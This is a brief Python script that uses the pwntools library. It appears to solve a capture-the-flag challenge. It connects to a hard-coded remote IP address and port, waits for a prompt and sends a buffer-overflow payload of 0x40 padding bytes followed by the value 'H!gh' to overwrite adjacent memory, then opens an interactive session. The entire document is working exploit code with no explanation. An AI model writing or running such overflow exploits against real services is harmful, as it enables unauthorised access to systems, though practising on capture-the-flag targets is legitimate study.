from pwn import *

r = remote('104.154.106.182', 1234)

r.recvuntil('?\n')
r.sendline('a' * 0x40 + 'H!gh')
r.interactive()
